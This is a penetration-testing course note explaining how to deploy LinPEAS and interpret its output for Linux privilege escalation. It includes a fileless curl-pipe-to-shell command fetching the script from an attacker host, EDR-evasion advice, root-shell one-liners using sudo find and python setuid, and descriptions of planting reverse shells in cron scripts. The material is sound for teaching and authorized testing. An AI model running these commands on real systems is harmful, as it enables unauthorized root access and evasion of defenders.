---
tags: [tools, privesc, enumeration, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.72 LinPEAS Complete Output Analysis"
---

# LinPEAS: Complete Output Analysis

## 1. Introduction to LinPEAS

`LinPEAS` (Linux Privilege Escalation Awesome Script) is arguably the most comprehensive and widely utilized post-exploitation enumeration script for Linux environments. Written primarily in Bash (with a statically compiled Go version available as `PEASS-ng`), LinPEAS systematically queries the local operating system to identify misconfigurations, weak permissions, plaintext credentials, and outdated software that can be leveraged for privilege escalation.

LinPEAS does not perform active exploitation. Instead, it acts as a highly advanced information-gathering engine, parsing gigabytes of system data and presenting it to the penetration tester in an actionable, color-coded format. Mastering LinPEAS requires not just running the tool, but deeply understanding how to interpret its voluminous output.

## 2. ASCII Architecture Diagram

```text
+-----------------------------------------------------------------------------------+
|                            LinPEAS Execution Flow                                 |
|                                                                                   |
|  +-----------------+       +---------------------------------------------------+  |
|  |                 |       |               Data Collection Phase               |  |
|  |    Attacker     |------>| 1. System Info (uname, release, path)             |  |
|  |  (Low Priv sh)  |       | 2. Environment Variables & PATH analysis          |  |
|  +-----------------+       | 3. Network & Routing tables                       |  |
|                            | 4. Running Processes & Cron jobs                  |  |
|                            | 5. User & Group Enumeration (sudoers, shadow)     |  |
|                            | 6. SUID/SGID Binary Search                        |  |
|                            | 7. File System Analysis (capabilities, mounts)    |  |
|                            | 8. Password & Key Hunting (grep -ri password ...) |  |
|                            +---------------------------------------------------+  |
|                                                    |                              |
|                                                    v                              |
|                            +---------------------------------------------------+  |
|                            |               Analysis & Heuristics               |  |
|                            | - Compares findings against known CVEs            |  |
|                            | - Evaluates file permissions (e.g., writable /etc)|  |
|                            | - Checks sudo token caching and configurations    |  |
|                            +---------------------------------------------------+  |
|                                                    |                              |
|                                                    v                              |
|                            +---------------------------------------------------+  |
|                            |                 Colorized Output                  |  |
|                            | [RED/YELLOW] 99% Certain Privilege Escalation     |  |
|                            | [RED] High Probability Vector                     |  |
|                            | [CYAN] Notable Finding, Requires Investigation    |  |
|                            | [GREEN] Standard Configuration / Safe             |  |
|                            +---------------------------------------------------+  |
+-----------------------------------------------------------------------------------+
```

## 3. Deployment and Execution Strategies

### 3.1 Stealth and OpSec Considerations
Running LinPEAS directly from disk leaves artifacts. In mature environments with EDR (Endpoint Detection and Response), dropping `linpeas.sh` to `/tmp/` will trigger alerts. 

**Memory-Only Execution (Fileless):**
The preferred execution method involves curling the script and piping it directly to bash, avoiding disk I/O.
```bash
# From attacker machine:
python3 -m http.server 80

# On target machine:
curl http://10.10.14.5/linpeas.sh | sh
```

**Logging Output:**
LinPEAS generates massive output. It is critical to log this output for offline analysis, especially if the shell dies.
```bash
# Execute and log with `tee`
curl http://10.10.14.5/linpeas.sh | sh | tee /tmp/peas.log
```

## 4. Analyzing the Output: Section by Section

LinPEAS output is divided into logical sections. Understanding the hierarchy of these sections is key to rapid triaging.

### 4.1 System Information & Environment
This initial section provides the context of the host.
- **OS Release & Kernel:** LinPEAS highlights known vulnerable kernel versions (e.g., Dirty COW, Dirty Pipe). If the kernel is highlighted in RED/YELLOW, kernel exploits are a viable path, though they carry a risk of crashing the system.
- **PATH Variable:** If the `$PATH` includes a directory writable by the current user (e.g., `.` or `/tmp`), it indicates a potential path hijacking vulnerability. If a root script executes a command without an absolute path (e.g., `systemctl` instead of `/bin/systemctl`), an attacker can place a malicious `systemctl` binary in the writable `$PATH` directory.

### 4.2 Available Software & Protection
- **Sudo Version:** Vulnerabilities like CVE-2021-3156 (Baron Samedit) are highlighted here based on the `sudo --version` output.
- **Compilers:** The presence of `gcc` or `make` indicates that exploit code can be compiled directly on the target, simplifying kernel exploitation.

### 4.3 Network Information
- **Active Ports:** LinPEAS maps listening ports (`netstat -tulpn`). Crucially, it identifies ports listening only on `127.0.0.1` (localhost). These are internal services (e.g., a local MySQL database, a development web server) that were inaccessible from the outside. Port forwarding/SSH tunneling will be required to interact with them.

### 4.4 User Information (The Most Critical Section)
- **Sudo Permissions (`sudo -l`):** LinPEAS automatically attempts to read sudo permissions.
  - *Finding:* `User alice may run the following commands: (root) NOPASSWD: /usr/bin/find`
  - *Analysis:* The user can run `find` as root without a password. This is a guaranteed privesc vector. The attacker cross-references this with GTFOBins (e.g., `sudo find . -exec /bin/sh \; -quit`).
- **Groups:** Membership in privileged groups like `docker`, `lxd`, `disk`, or `shadow` are immediate vectors. For instance, membership in the `docker` group allows a user to mount the host's root filesystem into a container, granting effective root access.

### 4.5 Cron Jobs and Timers
LinPEAS extracts system-wide and user-specific cron jobs (`/etc/crontab`, `/var/spool/cron/crontabs/`).
- **Writable Cron Scripts:** If a script executed by cron (as root) is writable by the current user, it is highlighted in RED/YELLOW. The attacker simply appends a reverse shell to the script.
- **Missing Scripts:** If a cron job attempts to execute a script that does not exist, and the directory is writable, the attacker can create the script.

### 4.6 Interesting Files
This is often the longest section and requires deep manual review.
- **SUID/SGID Binaries:** LinPEAS finds all binaries with the Set-Owner-User-ID bit set (`find / -perm -4000 2>/dev/null`). When executed, these binaries run with the privileges of their owner (usually root). LinPEAS highlights non-standard SUID binaries or those known to GTFOBins (e.g., `exim4`, `pkexec`, `bash`).
- **Capabilities:** Linux capabilities divide root privileges into smaller units. LinPEAS checks for dangerous capabilities assigned to binaries (`getcap -r /`).
  - *Finding:* `/usr/bin/python3.8 = cap_setuid,cap_setgid+ep`
  - *Analysis:* Python has the capability to set its own UID. The attacker can execute `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` for an instant root shell.
- **Writable Sensitive Files:** Modifiable `/etc/passwd` or `/etc/shadow` are game over. If `/etc/passwd` is writable, an attacker can generate a new hash using `openssl passwd` and append a new root user directly into the file.
- **Passwords and Secrets Hunting:** LinPEAS aggressively greps the filesystem for files ending in `.bak`, `.conf`, `.sql`, `.env`, and searches within files for strings like "password=", "DB_PASS", or "AWS_ACCESS_KEY". This often unearths hardcoded credentials left behind by developers or system administrators.

## 5. Advanced Analysis: Reading the "Cyan"
While RED/YELLOW findings are near-certain exploits, the true value of an experienced analyst lies in interpreting CYAN findings. Cyan indicates a deviation from the standard, but requires contextual understanding.

For example, a cyan finding might highlight a strange backup script in `/opt/scripts/`. While the script itself might not be writable, reading its contents might reveal that it calls a relative binary, or reads an environment variable in an insecure way, leading to exploitation.

## 6. False Positives and Pitfalls
- **Docker Environments:** When running inside a container, LinPEAS will report the kernel version of the *host*. Kernel exploits run inside a container will only compromise the container itself, not necessarily break out of it, unless a specific container escape vulnerability exists.
- **GTFOBins Blind Spots:** LinPEAS relies heavily on the GTFOBins database. If a custom, proprietary SUID binary is present, LinPEAS will flag it, but won't provide the exploit path. This requires manual reverse engineering or fuzzing of the binary.

## 7. Chaining Opportunities
- **[[71 - pspy Linux Process Snooper]]:** LinPEAS analyzes static cron configurations; `pspy` tracks them dynamically.
- **[[GTFOBins Reference]]:** Every SUID, sudo, or capability finding must be cross-referenced with GTFOBins for the exact exploitation syntax.
- **[[Port Forwarding and Pivoting]]:** Internal ports discovered by LinPEAS must be proxied out to the attacker infrastructure for interaction.
- **[[Kernel Exploitation]]:** If LinPEAS flags a vulnerable kernel, specific C exploits must be compiled and executed.

## 8. Related Notes
- [[Linux Privilege Escalation Methodology]]: The overarching framework within which LinPEAS operates.
- [[Analyzing SUID and SGID Binaries]]: Deep dive into the mechanics of SetUID vulnerabilities.
- [[Exploiting Misconfigured Capabilities]]: How to abuse `cap_setuid`, `cap_dac_read_search`, etc.
